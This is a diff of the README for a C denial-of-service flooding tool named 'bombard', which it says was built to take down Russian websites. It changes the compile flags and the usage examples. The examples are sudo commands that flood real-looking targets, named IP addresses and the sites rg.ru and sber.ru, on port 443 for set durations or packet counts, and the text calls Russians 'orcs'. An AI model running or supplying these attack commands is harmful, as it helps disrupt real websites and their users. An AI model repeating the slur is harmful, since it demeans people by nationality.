@@ -6,7 +6,7 @@ Built specifically to bring russian orc websites down to their knees.
 ## Compile command
 
 ```bash
-gcc main.c -o bombard -lpthread
+gcc main.c -O2 -o bombard -lpthread
 ```
 
 ## Usage examples
@@ -26,12 +26,12 @@ sudo ./bombard -a 194.190.37.226 -p 443 -c 4
 ### Attack for 60 seconds
 
 ```bash
-sudo ./bombard -a 178.248.235.122 -p 443 -c 4 -d 60
+sudo ./bombard -u rg.ru/ -p 443 -c 4 -d 60
 ```
 
 ### Send 1000000 packets
 
 ```bash
-sudo ./bombard -a https://sber.ru -c 10 -n 1000000
+sudo ./bombard -u https://sber.ru -c 10 -n 1000000
 ```
 
